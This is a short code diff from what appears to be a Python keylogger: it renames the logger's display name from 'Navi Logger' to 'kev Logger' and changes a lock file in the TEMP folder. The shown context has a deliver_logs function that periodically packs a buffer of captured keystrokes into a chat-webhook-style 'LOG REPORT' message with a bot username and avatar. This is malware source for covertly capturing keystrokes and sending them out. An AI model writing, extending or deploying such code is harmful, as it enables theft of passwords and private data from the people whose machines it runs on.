@@ -76,7 +76,7 @@ def deliver_logs():
         time.sleep(REPORT_DELAY)
         if keys_buffer.strip():
             payload = {
-                "username": "Navi Logger",
+                "username": "kev Logger",
                 "avatar_url": "https://i.ibb.co/Wv94YGVx/navi.png",
                 "content": f"**[ LOG REPORT - {time.ctime()} ]**\n```\n{keys_buffer[:1900]}\n```"
             }
@@ -120,7 +120,7 @@ def main():
 
 if __name__ == "__main__":
     time.sleep(0.5)
-    lock_file = os.path.join(os.getenv("TEMP"), "navi_lock.tmp")
+    lock_file = os.path.join(os.getenv("TEMP"), "kev_lock.tmp")
     if os.path.exists(lock_file):
         try:
             os.remove(lock_file)
